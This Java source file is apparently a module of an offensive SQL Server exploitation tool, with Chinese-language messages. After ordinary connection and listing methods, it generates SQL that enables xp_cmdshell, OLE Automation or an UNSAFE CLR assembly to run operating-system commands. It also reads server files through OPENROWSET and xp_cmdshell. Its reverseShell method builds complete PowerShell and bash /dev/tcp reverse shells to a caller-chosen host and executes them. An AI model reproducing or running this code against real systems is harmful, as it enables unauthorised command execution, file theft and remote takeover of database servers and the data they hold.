package database;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class mssql {

    private final String host;
    private final String port;
    private final String database;
    private final String username;
    private final String password;
    private Connection conn;

    public mssql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
    }

    private Connection getConnection() throws SQLException {
        if (conn == null || conn.isClosed()) {
            String url = "jdbc:sqlserver://" + host + ":" + port + ";databaseName=" + database + ";encrypt=false;trustServerCertificate=true";
            conn = DriverManager.getConnection(url, username, password);
        }
        return conn;
    }

    public void close() {
        try {
            if (conn != null && !conn.isClosed()) conn.close();
        } catch (SQLException ignored) {}
    }

    public boolean testConnection() {
        String url = "jdbc:sqlserver://" + host + ":" + port + ";databaseName=" + database + ";encrypt=false;trustServerCertificate=true";
        try (Connection tmp = DriverManager.getConnection(url, username, password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }

    public List<String> getDatabases() {
        List<String> dbs = new ArrayList<>();
        String url = "jdbc:sqlserver://" + host + ":" + port + ";databaseName=master;encrypt=false;trustServerCertificate=true";
        try (Connection c = DriverManager.getConnection(url, username, password);
             Statement stmt = c.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")) {
            while (rs.next()) dbs.add(rs.getString(1));
        } catch (SQLException e) {
            System.out.println("[-] 获取数据库列表失败: " + e.getMessage());
        }
        return dbs;
    }

    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        String sql = "SELECT name FROM sys.schemas ORDER BY name";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql); ResultSet rs = ps.executeQuery()) {
                while (rs.next()) schemas.add(rs.getString(1));
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return schemas;
    }

    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT t.name FROM sys.tables t JOIN sys.schemas s ON t.schema_id = s.schema_id WHERE s.name = ? ORDER BY t.name";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, schema);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) tables.add(rs.getString(1));
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return tables;
    }

    public List<String> getColumnNames(String schema, String table) {
        List<String> cols = new ArrayList<>();
        String sql = "SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id = t.object_id JOIN sys.schemas s ON t.schema_id = s.schema_id WHERE s.name = ? AND t.name = ? ORDER BY c.column_id";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, schema);
                ps.setString(2, table);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) cols.add(rs.getString(1));
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return cols;
    }

    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        String sql = "SELECT TOP " + limit + " * FROM [" + schema + "].[" + table + "]";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql); ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int colCount = meta.getColumnCount();
                while (rs.next()) {
                    List<Object> row = new ArrayList<>();
                    for (int i = 1; i <= colCount; i++) row.add(rs.getObject(i));
                    rows.add(row);
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return rows;
    }

    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) return "[!] SQL语句不能为空！";
        StringBuilder sb = new StringBuilder();
        Connection c = getConnection();
        try (Statement stmt = c.createStatement()) {
            boolean hasResultSet = stmt.execute(sql);
            if (hasResultSet) {
                try (ResultSet rs = stmt.getResultSet()) {
                    ResultSetMetaData meta = rs.getMetaData();
                    int colCount = meta.getColumnCount();
                    while (rs.next()) {
                        for (int i = 1; i <= colCount; i++) {
                            String val = rs.getString(i);
                            if (i > 1) sb.append("\t");
                            sb.append(val != null ? val : "NULL");
                        }
                        sb.append("\n");
                    }
                }
            }
        } catch (Exception e) {
            if (sb.length() > 0) sb.append("\n");
            sb.append("[-] ").append(e.getMessage());
        }
        return sb + "\n";
    }

    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {
                try (ResultSet rs = stmt.executeQuery("SELECT @@VERSION")) {
                    if (rs.next()) sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SELECT SUSER_NAME()")) {
                    if (rs.next()) sb.append("[+] Current User: ").append(rs.getString(1)).append("\n");
                }
                try (ResultSet rs = stmt.executeQuery("SELECT CAST(SERVERPROPERTY('InstanceDefaultDataPath') AS NVARCHAR(4000))")) {
                    if (rs.next()) sb.append("[+] Data directory: ").append(rs.getString(1)).append("\n");
                }
            }
        } catch (SQLException e) {
            sb.append("[-] 获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }
        return sb.toString();
    }

    /**
     * 生成执行系统命令的 SQL（UDF 风格对齐）
     * 支持：xp_cmdshell（默认）/ CLR（占位说明）。
     */
    public static String exCmd(String type, String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) {
            cmd = "whoami";
        }
        String safeCmd = cmd.replace("'", "''");

        String xp = """
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
                EXEC xp_cmdshell '%s';
                """;

        if (type == null || type.isEmpty() || "xp_cmdshell".equalsIgnoreCase(type)) {
            return String.format(xp, safeCmd);
        }

        if ("CLR".equalsIgnoreCase(type)) {
            String clr = """
                    EXEC sp_configure 'show advanced options', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'clr enabled', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'clr strict security', 0;
                    RECONFIGURE;

                    BEGIN TRY
                        -- 若未安装程序集则尝试安装
                        IF NOT EXISTS (SELECT 1 FROM sys.assemblies WHERE name = 'ClrExec')
                        BEGIN
                            DECLARE @dll NVARCHAR(4000) = NULL;

                            -- 先尝试常见路径（可能抛错，置于 TRY 中）
                            BEGIN TRY
                                IF EXISTS (SELECT 1 FROM OPENROWSET(BULK 'C\\Windows\\Temp\\ClrExec.dll', SINGLE_BLOB) AS x)
                                    SET @dll = 'C\\Windows\\Temp\\ClrExec.dll';
                            END TRY BEGIN CATCH END CATCH;

                            IF @dll IS NULL
                            BEGIN TRY
                                IF EXISTS (SELECT 1 FROM OPENROWSET(BULK '/tmp/ClrExec.dll', SINGLE_BLOB) AS x)
                                    SET @dll = '/tmp/ClrExec.dll';
                            END TRY BEGIN CATCH END CATCH;

                            -- 再用 xp_fileexist 兜底检测
                            IF @dll IS NULL
                            BEGIN
                                DECLARE @exists INT;
                                EXEC master.dbo.xp_fileexist 'C\\Windows\\Temp\\ClrExec.dll', @exists OUT;
                                IF @exists = 1 SET @dll = 'C\\Windows\\Temp\\ClrExec.dll';
                                ELSE
                                BEGIN
                                    EXEC master.dbo.xp_fileexist '/tmp/ClrExec.dll', @exists OUT;
                                    IF @exists = 1 SET @dll = '/tmp/ClrExec.dll';
                                END
                            END

                            IF @dll IS NULL
                            BEGIN
                                PRINT '[-] 未找到 CLR DLL，请将 ClrExec.dll 放到 C\\Windows\\Temp 或 /tmp';
                            END
                            ELSE
                            BEGIN
                                DECLARE @sql NVARCHAR(MAX) = 'CREATE ASSEMBLY [ClrExec] FROM ''' + @dll + ''' WITH PERMISSION_SET = UNSAFE;';
                                EXEC (@sql);
                            END
                        END

                        -- 创建过程（命名：dbo.clr_exec），映射到程序集中的 StoredProcedures.Exec
                        IF NOT EXISTS (SELECT 1 FROM sys.procedures WHERE name = 'clr_exec')
                        BEGIN
                            EXEC ('CREATE PROCEDURE [dbo].[clr_exec] (@cmd NVARCHAR(MAX)) AS EXTERNAL NAME [ClrExec].[StoredProcedures].[Exec]');
                        END
                    END TRY
                    BEGIN CATCH
                        PRINT '[-] CLR 安装失败: ' + ERROR_MESSAGE();
                    END CATCH;

                    -- 执行命令
                    EXEC [dbo].[clr_exec] N'%s';
                    """;
            return String.format(clr, safeCmd);
        }

        if ("OLE".equalsIgnoreCase(type)) {
            String ole = """
                    EXEC sp_configure 'show advanced options', 1;
                    RECONFIGURE;
                    EXEC sp_configure 'Ole Automation Procedures', 1;
                    RECONFIGURE;
                    DECLARE @shell INT;
                    EXEC sp_OACreate 'WScript.Shell', @shell OUT;
                    EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c %s', 0, TRUE;
                    EXEC sp_OADestroy @shell;
                    """;
            return String.format(ole, safeCmd);
        }

        return String.format(xp, safeCmd);
    }

    /**
     * 生成读取文件内容的 SQL
     * 支持：OPENROWSET（SINGLE_CLOB）与 xp_cmdshell 回退。
     */
    public static String readFiles(String path, String type) {
        if (path == null || path.trim().isEmpty()) {
            path = "C:/Windows/win.ini";
        }
        String safePath = path.replace("'", "''");

        String openrowset = "SELECT BulkColumn FROM OPENROWSET(BULK '%s', SINGLE_CLOB) AS x;";
        String shell = """
                EXEC sp_configure 'show advanced options', 1;
                RECONFIGURE;
                EXEC sp_configure 'xp_cmdshell', 1;
                RECONFIGURE;
                EXEC xp_cmdshell 'type %s';
                """;
        String dirtree = "EXEC xp_dirtree '%s', 1, 1;";

        if (type == null || type.isEmpty()) type = "OPENROWSET";

        if ("OPENROWSET".equalsIgnoreCase(type)) {
            return String.format(openrowset, safePath);
        } else if ("xp_cmdshell".equalsIgnoreCase(type)) {
            return String.format(shell, safePath);
        } else if ("DIR_LIST".equalsIgnoreCase(type)) {
            return String.format(dirtree, safePath);
        }

        return String.format(openrowset, safePath);
    }

    private String detectOS() {
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement(); ResultSet rs = stmt.executeQuery("SELECT @@VERSION")) {
                String ver = rs.next() ? rs.getString(1).toLowerCase() : "";
                if (ver.contains("windows")) return "windows";
                if (ver.contains("linux")) return "linux";
                return "unknown";
            }
        } catch (SQLException e) {
            return "unknown";
        }
    }

    public boolean reverseShell(String host, int port) {
        if (host == null || host.trim().isEmpty()) return false;
        if (port < 1 || port > 65535) return false;

        String os = detectOS();
        String cmd;
        if ("windows".equals(os)) {
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"";
        } else if ("linux".equals(os)) {
            cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'";
        } else {
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"";
        }

        try {
            String sql = exCmd("xp_cmdshell", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            sql = exCmd("OLE", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            sql = exCmd("CLR", cmd);
            if (!sql.isEmpty()) {
                executeSQL(sql);
                return true;
            }

            return false;
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return false;
        }
    }
}